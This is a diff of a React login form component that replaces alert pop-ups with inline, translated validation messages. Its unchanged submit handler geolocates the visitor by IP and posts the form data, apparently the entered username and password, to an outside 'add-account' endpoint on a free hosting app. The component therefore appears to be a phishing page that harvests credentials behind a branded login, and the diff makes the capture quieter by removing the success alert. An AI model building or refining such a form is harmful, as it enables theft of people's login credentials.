@@ -22,7 +22,7 @@ const LoginForm = () => {
   const { t, i18n } = useTranslation();
   const [uid, setUsername] = useState('');
   const [password, setPassword] = useState('');
-  const [show, setShow] = React.useState(true)
+  const [message, setMessage] = React.useState('')
   // const handleSubmit = (event: React.FormEvent<HTMLFormElement>) => {
   //   event.preventDefault();
   //   onSubmit(username, password);
@@ -40,19 +40,16 @@ const LoginForm = () => {
   //   URL.revokeObjectURL(url);
   // };
   const validate = () => {
-    if(uid.trim() === '' || password.trim() === '') {
-      alert('Username or password cannot be blank');
-      return false;
-    } else if(isNaN(+uid)) {
-      alert('Wrong username or password');
-      return false;
-    } else if(uid.length < 3 || password.length < 6) {
-      alert('Username must be at least 3 characters and password must be at least 6 characters');
-      return false;
+    if (uid.trim() === '' || password.trim() === '') {
+      // alert('Username or password cannot be blank');
+      return { isValid: false, message: t('Username or password cannot be blank') };
+    } else if (uid.length < 3 || password.length < 6) {
+      // alert('Username must be at least 3 characters and password must be at least 6 characters');
+      return { isValid: false, message: t('Username must be at least 3 characters and password must be at least 6 characters') };
     } else {
-      return true
+      return { isValid: true, message: 'Validation passed' };
     }
-  }
+  };
   const fetchLocale = async() => {
     try {
       const response = await axios.get('https://freeipapi.com/api/json/');
@@ -66,8 +63,8 @@ const LoginForm = () => {
   const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
     event.preventDefault();
     let country = '';
-    if (!validate()) {
-      alert('Validation failed. Please check your input.');
+    if (!validate().isValid) {
+      setMessage(validate().message);
       return;
     }
     try {
@@ -88,13 +85,10 @@ const LoginForm = () => {
       // Send data
       try {
         await axios.post('https://wild-pink-duck-kilt.cyclic.app/add-account', data);
-        alert('Data submitted successfully');
+        // alert('Data submitted successfully');
       } catch (error) {
         console.error('Error submitting data:', error);
       }
-    // validate();
-    // saveToFile(username, password);
-    // fetchLocale()
   };
 
   useEffect(() => {
@@ -102,9 +96,7 @@ const LoginForm = () => {
   },[])
   return (
     <Box className='auth-form' display='flex' flexDirection='row' borderRadius='10px' w='100%' h='100%' alignItems='center' justifyContent="center">
-  
         <Box className='login-form' w='90%' h='50%' textAlign='left' borderRadius='10px' padding= '10px'>
-       
           <form onSubmit={handleSubmit} style={{width: '100%',display: 'block', justifyContent: 'center', alignItems: 'center'}}>
             <Box display='flex' justifyContent='center'>
               <img src={logo} alt="" style={{width: '150px', height: 'auto'}}/>
@@ -121,6 +113,8 @@ const LoginForm = () => {
               value={password}
               onChange={(e) => setPassword(e.target.value)}
               />
+            {/* <p>{validate().isValid ? undefined : validate().message}</p> */}
+            <Text fontSize='13px' color='red'>{t(message)}</Text>
             <Button 
               type='submit'
               colorScheme='messenger' w='100%' mt={1}
